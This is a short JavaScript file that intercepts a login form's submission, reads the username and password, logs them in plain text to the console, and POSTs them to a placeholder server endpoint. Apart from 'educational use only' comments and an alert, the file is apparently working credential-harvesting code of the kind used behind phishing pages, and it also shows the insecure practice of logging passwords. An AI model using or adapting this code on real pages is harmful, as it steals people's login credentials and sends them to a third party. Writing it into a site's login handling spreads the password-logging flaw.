// script.js
document.getElementById("loginForm").addEventListener("submit", function (event) {
    event.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    console.log(`Username: ${username}, Password: ${password}`); // Logs details (for educational use only)

    // Example of sending data to a server (use with caution)
    fetch("https://your-server-endpoint.com/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password })
    })
    .then(response => response.json())
    .then(data => console.log("Data submitted:", data))
    .catch(error => console.error("Error:", error));

    alert("Details submitted (Educational use only)");
});
